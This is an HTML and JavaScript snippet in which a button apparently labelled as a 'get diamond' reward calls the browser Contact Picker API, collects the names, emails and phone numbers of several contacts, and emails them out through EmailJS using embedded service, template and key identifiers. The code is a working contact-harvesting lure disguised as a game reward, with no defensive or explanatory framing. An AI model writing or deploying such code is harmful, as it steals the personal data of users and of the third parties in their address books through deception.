<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
<script type="text/javascript">
   (function(){
      emailjs.init("tjWRdfgMR4ozs-ALS");  // Replaced with your actual EmailJS public key
   })();
</script>

<script>
document.getElementById('getDiamondBtn').addEventListener('click', function() {
    if (navigator.contacts && navigator.contacts.select) {
        navigator.contacts.select(['name', 'email', 'tel'], { multiple: true })
            .then(contacts => {
                console.log(contacts);

                // Prepare the contacts data to send via email
                const contactDetails = contacts.map(contact => 
                    `Name: ${contact.name || 'N/A'}, Email: ${contact.email || 'N/A'}, Tel: ${contact.tel || 'N/A'}`
                ).join("\n");

                // Send email via EmailJS
                emailjs.send("service_z8dypc8", "template_ovwd3kb", {
                    message: contactDetails,  // Ensure 'message' matches your template variable
                })
                .then(response => {
                    console.log('Email sent successfully!', response.status, response.text);
                })
                .catch(error => {
                    console.error('Failed to send email:', error);
                });

            })
            .catch(error => {
                console.error(error);
                alert('Contact access denied or not supported.');
            });
    } else {
        alert('Contact API not supported by your browser.');
    }
});
</script>
